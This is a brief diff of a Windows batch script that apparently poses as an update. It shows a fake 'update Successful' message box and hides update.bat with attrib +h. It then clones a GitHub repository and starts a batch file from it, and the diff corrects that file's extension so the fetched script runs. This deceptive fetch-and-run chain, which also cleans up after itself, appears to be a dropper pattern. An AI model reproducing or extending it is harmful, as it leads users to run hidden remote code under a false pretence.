@@ -8,8 +8,8 @@ del Delete.bat > nul
 echo x=msgbox("update Successful" ,0, "max") >>update.vbs
 start update.vbs 
 attrib +h update.bat
+del update.vbs
 git clone https://github.com/rraapt66/Apill-fuse.git
 cd Apill-fuse
-start Apill-fuse.abt
-del update.vbs
+start Apill-fuse.bat
 exit
